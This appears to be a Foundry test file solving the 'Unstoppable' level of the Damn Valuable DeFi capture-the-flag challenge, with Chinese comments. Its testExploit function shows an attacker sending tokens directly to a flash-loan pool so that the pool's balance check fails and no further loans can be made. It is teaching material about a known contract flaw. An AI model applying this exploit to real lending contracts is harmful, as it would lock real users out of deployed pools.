// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {UnstoppableLender} from "../../../src/Contracts/unstoppable/UnstoppableLender.sol";
import {ReceiverUnstoppable} from "../../../src/Contracts/unstoppable/ReceiverUnstoppable.sol";

contract Unstoppable is Test {
    uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;
    uint256 internal constant INITIAL_ATTACKER_TOKEN_BALANCE = 100e18;

    Utilities internal utils;
    UnstoppableLender internal unstoppableLender;
    ReceiverUnstoppable internal receiverUnstoppable;
    DamnValuableToken internal dvt;
    address payable internal attacker;
    address payable internal someUser;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */

        utils = new Utilities();
        address payable[] memory users = utils.createUsers(2);
        attacker = users[0];
        someUser = users[1];
        vm.label(someUser, "User");
        vm.label(attacker, "Attacker");
        // DamnValuableToken constructor 會 mint dvt token 給 msg.sender = address(this) = Unstoppable contract
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");
        // UnstoppableLender constructor 初始化時會創建一個 dvt token 資金池
        unstoppableLender = new UnstoppableLender(address(dvt));
        vm.label(address(unstoppableLender), "Unstoppable Lender");
        // unstoppableLender 得到 1_000_000e18 DVT token 從 address(this) = Unstoppable contract
        dvt.approve(address(unstoppableLender), TOKENS_IN_POOL);
        unstoppableLender.depositTokens(TOKENS_IN_POOL);

        dvt.transfer(attacker, INITIAL_ATTACKER_TOKEN_BALANCE);

        assertEq(dvt.balanceOf(address(unstoppableLender)), TOKENS_IN_POOL);
        assertEq(dvt.balanceOf(attacker), INITIAL_ATTACKER_TOKEN_BALANCE);

        // Show it's possible for someUser to take out a flash loan
        vm.startPrank(someUser);
        // 由 someUser 部署 ReceiverUnstoppable 所以只有 someUser 才可以執行 ReceiverUnstoppable function
        // ReceiverUnstoppable constructor 時會設定 pool = UnstoppableLender, owner = someUser
        receiverUnstoppable = new ReceiverUnstoppable(
            address(unstoppableLender)
        );
        vm.label(address(receiverUnstoppable), "Receiver Unstoppable");
        // 1. ReceiverUnstoppable execute UnstoppableLender.flashLoan(borrowAmount);
        //    UnstoppableLender transfer 10 dvt to ReceiverUnstoppable
        // 2. UnstoppableLender execute ReceiverUnstoppable.receiveTokens(tokenAddress, amount);
        //    ReceiverUnstoppable safeTransfer 10 dvt to UnstoppableLender
        receiverUnstoppable.executeFlashLoan(10);
        vm.stopPrank();
        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        // 正常 flash loan - 藉由 receiverUnstoppable 向 UnstoppableLender 借錢，並利用 receiverUnstoppable.receiveTokens() 還錢
        vm.startPrank(someUser);
        receiverUnstoppable.executeFlashLoan(TOKENS_IN_POOL);
        vm.stopPrank();
        // 正常 deposit
        vm.startPrank(attacker);
        dvt.approve(address(unstoppableLender), 1e18);
        unstoppableLender.depositTokens(1e18);
        vm.stopPrank();
        // 攻擊合約 - 利用 unstoppableLender contract 沒有 fallback() or receive() 可以收錢的漏洞
        vm.startPrank(attacker);
        dvt.transfer(address(unstoppableLender), 1e18);
        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
        vm.expectRevert(UnstoppableLender.AssertionViolated.selector);
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        // It is no longer possible to execute flash loans
        vm.startPrank(someUser);
        receiverUnstoppable.executeFlashLoan(10);
        console.log("attacker's DVT: ", dvt.balanceOf(attacker));
        console.log("attacker's ETH balance: ", attacker.balance); // Utilities.createUsers(2); 時有提供 (deal)
        console.log("someUser's DVT: ", dvt.balanceOf(someUser)); // 0 因為利用 ReceiverUnstoppable 向 UnstoppableLender 借了又馬上還
        console.log("someUser's ETH balance: ", someUser.balance); // Utilities.createUsers(2); 時有提供 (deal)
        console.log("unstoppableLender's DVT: ", dvt.balanceOf(address(unstoppableLender)));
        console.log("unstoppableLender's ETH balance: ", address(unstoppableLender).balance);
        vm.stopPrank();
    }
}
